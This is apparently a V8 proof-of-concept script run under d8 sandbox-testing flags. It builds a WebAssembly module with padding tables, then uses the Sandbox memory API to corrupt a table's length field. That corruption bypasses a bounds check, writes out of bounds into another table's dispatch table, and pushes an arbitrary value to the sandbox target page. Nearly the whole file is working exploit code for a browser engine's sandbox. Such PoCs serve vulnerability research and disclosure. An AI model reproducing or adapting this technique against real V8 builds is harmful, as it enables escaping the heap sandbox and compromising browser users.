
// Flags: --sandbox-testing --experimental-wasm-type-reflection

d8.file.execute("/home/vult/Desktop/v8-wasm/v8/test/mjsunit/wasm/wasm-module-builder.js");

// module 0
let builder = new WasmModuleBuilder();
let $struct = builder.addStruct([makeField(kWasmI64, true)]);
let $sig_v_ls = builder.addType(makeSig([kWasmI64, wasmRefType($struct)], []));
let $sig_v_ll = builder.addType(makeSig([kWasmI64, kWasmI64], []));
let $writer = builder.addFunction("writer", $sig_v_ls)
  .exportFunc()
  .addBody([
    kExprLocalGet, 1,
    kExprLocalGet, 0,
    kGCPrefix, kExprStructSet, $struct, 0,
  ]);
let $boom = builder.addFunction("boom", $sig_v_ll)
  .exportFunc()
  .addBody([
    kExprLocalGet, 1,
    kExprLocalGet, 0,
    kExprI32Const, 0,
    kExprCallIndirect, $sig_v_ll, 0,
  ])
let $dummy = builder.addFunction("dummy", $sig_v_ll).exportFunc().addBody([]);
// target table
let $t0 =
  builder.addTable(wasmRefType($sig_v_ll), 1, 1, [kExprRefFunc, $dummy.index]).exportAs("table_v_ll");
// padding tables for alignment
let $td0 =
  builder.addTable(wasmRefType($sig_v_ll), 1, 1, [kExprRefFunc, $dummy.index]).exportAs("table_dummy_0");
let $td1 =
  builder.addTable(wasmRefType($sig_v_ll), 1, 1, [kExprRefFunc, $dummy.index]).exportAs("table_dummy_1");
let $td2 =
  builder.addTable(wasmRefType($sig_v_ll), 1, 1, [kExprRefFunc, $dummy.index]).exportAs("table_dummy_2");
// oob table
let $t1 =
  builder.addTable(wasmRefType($sig_v_ls), 1, 1, [kExprRefFunc, $writer.index]).exportAs("table_v_ls");

let instance = builder.instantiate();
let { writer, dummy, boom, table_v_ls, table_v_ll } = instance.exports;

// Prepare corruption utilities.
const kHeapObjectTag = 1;
const kWasmTableObjectTypeOffset = 28;
let memory = new DataView(new Sandbox.MemoryView(0, 0x100000000));
function getPtr(obj) {
  return Sandbox.getAddressOf(obj) + kHeapObjectTag;
}
function getField(obj, offset) {
  return memory.getUint32(obj + offset - kHeapObjectTag, true);
}
function setField(obj, offset, value) {
  memory.setUint32(obj + offset - kHeapObjectTag, value, true);
}

setField(getPtr(table_v_ls), 0x10, 0xfffffffe); // table->current_length = (smi)-1
setField(getPtr(table_v_ls), 0x14, 0xfffffffe); // table->current_length = (smi)-1

// call table set
// check bypassed, write @ index -7 -> writes exactly into table_v_ll dispatch table!
table_v_ls.set(0xfffffff9, writer);

boom(BigInt(Sandbox.targetPage) - 0x7n, 0xdeadbeefcafebaben);